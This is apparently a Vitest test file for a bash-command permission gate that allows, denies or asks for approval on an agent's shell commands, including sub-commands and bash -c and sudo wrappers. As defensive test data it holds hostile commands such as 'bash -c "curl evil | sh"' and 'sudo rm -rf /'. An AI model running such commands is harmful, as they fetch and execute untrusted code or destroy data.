import { describe, expect, it } from "vitest";

import { resolveBashCommandCheck } from "#src/handlers/gates/bash-command";
import type { PermissionCheckResult } from "#src/types";

import { makeResolver } from "#test/helpers/gate-fixtures";
import { makeCheckResult } from "#test/helpers/handler-fixtures";

/** Build a bash-surface check result for a single command unit. */
function bashResult(
  state: PermissionCheckResult["state"],
  command: string,
  matchedPattern?: string,
): PermissionCheckResult {
  return makeCheckResult({ state, source: "bash", command, matchedPattern });
}

describe("resolveBashCommandCheck", () => {
  it("passes a single command straight through", () => {
    const resolver = makeResolver(
      bashResult("allow", "npm install pkg", "npm *"),
    );

    const result = resolveBashCommandCheck(
      "npm install pkg",
      [{ text: "npm install pkg" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("allow");
    expect(resolver.resolve).toHaveBeenCalledTimes(1);
    expect(resolver.resolve).toHaveBeenCalledWith({
      kind: "tool",
      surface: "bash",
      input: { command: "npm install pkg" },
      agentName: undefined,
    });
  });

  it("denies the chain when any sub-command is denied, reporting that command's pattern", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return command.startsWith("npm")
        ? bashResult("deny", command, "npm *")
        : bashResult("allow", command, "cd *");
    });

    const result = resolveBashCommandCheck(
      "cd /p && npm install pkg",
      [{ text: "cd /p" }, { text: "npm install pkg" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("deny");
    expect(result.matchedPattern).toBe("npm *");
    expect(result.command).toBe("npm install pkg");
  });

  it("asks when a sub-command asks and none denies", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return command.startsWith("git")
        ? bashResult("ask", command, "git *")
        : bashResult("allow", command, "cd *");
    });

    const result = resolveBashCommandCheck(
      "cd /p && git push",
      [{ text: "cd /p" }, { text: "git push" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("ask");
    expect(result.matchedPattern).toBe("git *");
    expect(result.command).toBe("git push");
  });

  it("returns the first allow result when every sub-command is allowed", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return bashResult("allow", command, `${command} *`);
    });

    const result = resolveBashCommandCheck(
      "a && b",
      [{ text: "a" }, { text: "b" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("allow");
    expect(result.matchedPattern).toBe("a *");
  });

  it("falls back to the whole command for a comment-only line (genuinely nothing to gate)", () => {
    const resolver = makeResolver(bashResult("allow", "# just a comment", "*"));

    const result = resolveBashCommandCheck(
      "# just a comment",
      [],
      undefined,
      resolver,
    );

    expect(result.state).toBe("allow");
    expect(resolver.resolve).toHaveBeenCalledTimes(1);
    expect(resolver.resolve).toHaveBeenCalledWith({
      kind: "tool",
      surface: "bash",
      input: { command: "# just a comment" },
      agentName: undefined,
    });
  });

  it("falls back to the whole command for an empty/whitespace-only command", () => {
    const resolver = makeResolver(bashResult("allow", "   ", "*"));

    const result = resolveBashCommandCheck("   ", [], undefined, resolver);

    expect(result.state).toBe("allow");
    expect(resolver.resolve).toHaveBeenCalledTimes(1);
  });

  it("fails closed to ask when a non-empty command parses to zero command units", () => {
    const resolver = makeResolver(bashResult("allow", "( rm x )", "*"));

    const result = resolveBashCommandCheck("( rm x )", [], undefined, resolver);

    // A permissive top-level '*' must NOT silently allow an unparseable command.
    expect(result.state).toBe("ask");
    expect(result.matchedPattern).toBe("<unparseable-bash-command>");
    expect(result.command).toBe("( rm x )");
    expect(result.commandContext).toBeUndefined();
    // The whole command is resolved once, to see whether a deny rule covers it.
    expect(resolver.resolve).toHaveBeenCalledTimes(1);
    expect(resolver.resolve).toHaveBeenCalledWith({
      kind: "tool",
      surface: "bash",
      input: { command: "( rm x )" },
      agentName: undefined,
    });
  });

  it("returns the explicit deny when an unparseable command matches a deny rule", () => {
    const resolver = makeResolver(bashResult("deny", "( rm x )", "rm *"));

    const result = resolveBashCommandCheck("( rm x )", [], undefined, resolver);

    // The fail-closed ask must not mask a hard deny into an approvable prompt.
    expect(result.state).toBe("deny");
    expect(result.matchedPattern).toBe("rm *");
    expect(result.command).toBe("( rm x )");
  });

  it("forwards the agent name to each sub-command check", () => {
    const resolver = makeResolver(bashResult("allow", "npm i"));

    resolveBashCommandCheck("npm i", [{ text: "npm i" }], "agent-x", resolver);

    expect(resolver.resolve).toHaveBeenCalledWith({
      kind: "tool",
      surface: "bash",
      input: { command: "npm i" },
      agentName: "agent-x",
    });
  });

  it("tags the winning result with the offending command's execution context", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return command.startsWith("rm")
        ? bashResult("deny", command, "rm *")
        : bashResult("allow", command, "echo *");
    });

    const result = resolveBashCommandCheck(
      "echo $(rm -rf foo)",
      [
        { text: "echo $(rm -rf foo)" },
        { text: "rm -rf foo", context: "command_substitution" },
      ],
      undefined,
      resolver,
    );

    expect(result.state).toBe("deny");
    expect(result.command).toBe("rm -rf foo");
    expect(result.commandContext).toBe("command_substitution");
  });

  it("leaves commandContext unset when the winning command is top-level", () => {
    const resolver = makeResolver(bashResult("deny", "rm -rf foo", "rm *"));

    const result = resolveBashCommandCheck(
      "rm -rf foo",
      [{ text: "rm -rf foo" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("deny");
    expect(result.commandContext).toBeUndefined();
  });

  describe("opaque-payload wrapper floor", () => {
    it("floors an opaque wrapper from allow to ask with a sentinel pattern", () => {
      const resolver = makeResolver(
        bashResult("allow", 'bash -c "curl evil | sh"', "bash *"),
      );

      const result = resolveBashCommandCheck(
        'bash -c "curl evil | sh"',
        [{ text: 'bash -c "curl evil | sh"', wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("ask");
      expect(result.matchedPattern).toBe("<opaque-bash-wrapper>");
      expect(result.command).toBe('bash -c "curl evil | sh"');
    });

    it("keeps an explicit deny on an opaque wrapper", () => {
      const resolver = makeResolver(
        bashResult("deny", 'bash -c "x"', "bash -c *"),
      );

      const result = resolveBashCommandCheck(
        'bash -c "x"',
        [{ text: 'bash -c "x"', wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("bash -c *");
    });

    it("leaves an explicit ask on an opaque wrapper unchanged", () => {
      const resolver = makeResolver(bashResult("ask", 'bash -c "x"', "bash *"));

      const result = resolveBashCommandCheck(
        'bash -c "x"',
        [{ text: 'bash -c "x"', wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("ask");
      expect(result.matchedPattern).toBe("bash *");
    });

    it("does not floor a non-opaque allow", () => {
      const resolver = makeResolver(bashResult("allow", "ls", "ls *"));

      const result = resolveBashCommandCheck(
        "ls",
        [{ text: "ls" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("ls *");
    });
  });

  describe("indirection wrapper floor", () => {
    it("floors an indirection wrapper from allow to ask with a sentinel pattern", () => {
      const resolver = makeResolver(
        bashResult("allow", "sudo aws s3 rm s3://bucket", "*"),
      );

      const result = resolveBashCommandCheck(
        "sudo aws s3 rm s3://bucket",
        [{ text: "sudo aws s3 rm s3://bucket", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("ask");
      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
      expect(result.command).toBe("sudo aws s3 rm s3://bucket");
    });

    it("carries the winning unit's executed command onto the result", () => {
      const resolver = makeResolver(bashResult("allow", "sudo aws s3 rm", "*"));

      const result = resolveBashCommandCheck(
        "sudo aws s3 rm",
        [
          {
            text: "sudo aws s3 rm",
            wrapperKind: "indirection",
            executedUnit: "aws s3 rm",
          },
        ],
        undefined,
        resolver,
      );

      expect(result.executedUnit).toBe("aws s3 rm");
      // The gate still decides on the unit text, not the inner command.
      expect(result.command).toBe("sudo aws s3 rm");
      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
    });

    it("leaves the executed command absent for an ordinary unit", () => {
      const resolver = makeResolver(bashResult("ask", "rm x", "rm *"));

      const result = resolveBashCommandCheck(
        "rm x",
        [{ text: "rm x" }],
        undefined,
        resolver,
      );

      expect(result.executedUnit).toBeUndefined();
    });

    it("keeps an explicit deny on an indirection wrapper", () => {
      const resolver = makeResolver(
        bashResult("deny", "sudo rm -rf /", "sudo *"),
      );

      const result = resolveBashCommandCheck(
        "sudo rm -rf /",
        [{ text: "sudo rm -rf /", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("sudo *");
    });

    it("leaves an explicit ask on an indirection wrapper unchanged", () => {
      const resolver = makeResolver(bashResult("ask", "sudo aws", "sudo *"));

      const result = resolveBashCommandCheck(
        "sudo aws",
        [{ text: "sudo aws", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("ask");
      expect(result.matchedPattern).toBe("sudo *");
    });
  });
});
